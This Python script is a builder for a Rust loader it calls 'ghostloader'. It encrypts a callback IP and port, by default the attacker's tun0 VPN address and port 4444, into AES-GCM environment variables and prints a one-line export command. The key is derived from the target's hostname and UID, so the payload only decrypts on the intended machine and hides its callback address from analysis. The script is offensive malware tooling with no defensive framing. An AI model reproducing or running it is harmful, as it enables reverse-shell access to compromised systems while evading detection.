#!/usr/bin/env python3
import sys
import os
import argparse
import socket
import struct
import fcntl
import logging
import secrets
import hashlib
from binascii import unhexlify, b2a_base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

def parse_port(s: str) -> int:
    try:
        p = int(s, 10)
        if not (0 <= p <= 65535):
            raise ValueError
        return p
    except ValueError:
        raise argparse.ArgumentTypeError("port must be an integer 0..65535")

def parse_hex_bytes(s: str, expected_len: int | None = None) -> bytes:
    s = s.strip().lower().replace(" ", "").replace("0x", "")
    if len(s) % 2 != 0:
        raise argparse.ArgumentTypeError("hex must have even length")
    try:
        b = unhexlify(s)
    except Exception as e:
        raise argparse.ArgumentTypeError(f"invalid hex: {e}")
    if expected_len is not None and len(b) != expected_len:
        raise argparse.ArgumentTypeError(f"expected {expected_len} bytes")
    return b

def get_tun0_ipv4() -> str:
    """Detect IPv4 of tun0 interface."""
    ifname = "tun0"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = socket.inet_ntoa(
            fcntl.ioctl(
                s.fileno(),
                0x8915,
                struct.pack("256s", ifname[:15].encode("utf-8")),
            )[20:24]
        )
        return addr
    except IOError as e:
        logging.error(f"No IPv4 address found for interface {ifname}: {e}")
        sys.exit(1)
    finally:
        if 's' in locals():
            s.close()

def main(argv=None):
    ap = argparse.ArgumentParser(description="Generate encrypted ENV values for the Rust ghostloader")
    ap.add_argument("port", type=parse_port, help="Port (0..65535)")
    ap.add_argument("ip", nargs="?", help="Optional IP. Defaults to tun0 IP unless --loopback is used.")
    ap.add_argument("--loopback", action="store_true", help="Use 127.0.0.1 instead of VPN IP")
    ap.add_argument("--key", help="Hex key (32 bytes), will be combined with UID + hostname")
    ap.add_argument("--iv", help="Hex IV (12 bytes). If omitted, random.")
    ap.add_argument("--aad", help="Hex AAD (8 bytes). If omitted, random.")
    args = ap.parse_args(argv)

    if not args.key:
        print("\n[!] Missing --key argument!")
        print("    You must provide a 32-byte hex key to derive the AES key.")
        print("    💡 Example:")
        print("        export AES_KEY=$(openssl rand -hex 32)")
        print("        python3 ghostloader.py 4444 --key \"$AES_KEY\"\n")
        sys.exit(1)

    # Determine IP
    if args.loopback:
        ip_str = "127.0.0.1"
    elif args.ip:
        ip_str = args.ip
    else:
        ip_str = get_tun0_ipv4()
    logging.info(f"Using IP: {ip_str}")

    try:
        packed_addr = socket.inet_pton(socket.AF_INET, ip_str)
    except Exception as e:
        logging.error(f"Invalid IPv4: {e}")
        sys.exit(1)

    # Build sockaddr_in
    plain = struct.pack("=H", socket.AF_INET) + struct.pack("!H", args.port) + packed_addr + b"\x00" * 8

    # Key derivation
    base_key = parse_hex_bytes(args.key, 32)
    hostname = socket.gethostname().encode()
    uid = str(os.getuid()).encode()
    derived_key = hashlib.sha256(hostname + uid + base_key).digest()
    logging.info("Derived AES key from SHA256(hostname + uid + AES_KEY)")

    # IV
    if args.iv:
        iv = parse_hex_bytes(args.iv, 12)
    else:
        iv = secrets.token_bytes(12)
        logging.warning(f"Generated random IV: {iv.hex()}")

    # AAD
    if args.aad:
        aad = parse_hex_bytes(args.aad, 8)
    else:
        aad = secrets.token_bytes(8)
        logging.warning(f"Generated random AAD: {aad.hex()}")

    # Encrypt
    aesgcm = AESGCM(derived_key)
    ct_and_tag = aesgcm.encrypt(iv, plain, aad)

    # Output
    print(f"\nHostname: {socket.gethostname()}")
    print(f"UID: {os.getuid()}")
    print("\n# --- Oneliner ENV export ---")
    print(f'export AES_KEY={args.key} && export ENC_PAYLOAD={b2a_base64(ct_and_tag, newline=False).decode()} && export ENC_IV={iv.hex()} && export ENC_AAD={aad.hex()}')
    print("# ----------------------------\n")

if __name__ == "__main__":
    main()
